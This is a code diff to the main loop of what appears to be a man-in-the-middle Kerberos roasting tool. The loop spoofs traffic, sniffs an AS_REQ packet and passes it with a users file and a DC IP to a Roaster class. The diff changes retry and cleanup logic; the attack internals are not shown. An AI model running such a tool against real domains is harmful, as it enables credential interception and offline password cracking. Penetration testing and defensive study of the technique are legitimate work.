@@ -34,32 +34,35 @@ def main(
         spoofer.start()
         
         sniffer = Sniffer(interface)
-        sniffer.run()
-        
         while True:
+            sniffer.run()
             while sniffer.as_req_packet == None:
                 pass
 
             roaster = Roaster(users, sniffer.as_req_packet, output_file, dc_ip)
             roaster.roast()
 
-            if roaster.roasted > 0:
+            if roaster.as_req_is_valid and roaster.roasted > 1:
+                break
+            
+            if not roaster.as_req_is_valid:
+                logger.info('Captured AS_REQ is not valid, restarting the sniffer...')
+            elif roaster.roasted <= 1:
+                logger.info('No account was successfully roasted (wrong entries in the users file?)')
                 break
 
             sniffer.as_req_packet = None
+            sniffer.stop()
 
         logger.info('Preparing to shutdown, may take several seconds..')
-        
+
+    except KeyboardInterrupt:
+        logger.info('Preparing to shutdown, may take several seconds...')
+
+    finally:
         sniffer.stop()
         spoofer.stop()
 
-        logger.info('Done!')
-    except KeyboardInterrupt:
-        logger.info('Preparing to shutdown, may take several seconds...')
-        
-        sniffer.stop()
-        spoofer.stop()
-        
         logger.info('Done!')
         
 
